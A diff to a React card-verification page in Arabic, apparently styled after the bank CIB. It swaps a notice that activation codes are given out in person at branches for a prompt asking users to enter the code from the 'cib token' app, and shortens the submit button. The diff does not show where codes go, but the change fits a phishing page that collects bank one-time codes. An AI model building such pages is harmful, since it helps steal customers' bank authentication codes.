@@ -169,9 +169,11 @@ export default function Verify() {
               </div>
             )}
 
-            <div className="bg-primary/5 border border-primary/20 rounded-xl p-5 text-sm md:text-base leading-relaxed text-center text-primary-foreground/90 font-medium">
-              يتم تسليم رمز التفعيل شخصياً في أي من فروع CIB لضمان أقصى درجات الأمان والخصوصية.
-            </div>
+           <div className="bg-primary/5 border border-primary/20 rounded-xl p-5 text-sm md:text-base leading-relaxed text-center text-primary-foreground/90 font-medium">
+  يرجى ادخال رمز التحقق من
+  <br />
+  تطبيق cib token لإتمام عملية التحقق والمتابعة
+</div>
 
             <Button 
               type="submit" 
@@ -185,7 +187,7 @@ export default function Verify() {
                   جاري التوثيق والتفعيل...
                 </span>
               ) : (
-                'تأكيد وتفعيل البطاقة'
+                'تأكيد  '
               )}
               <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]" />
             </Button>
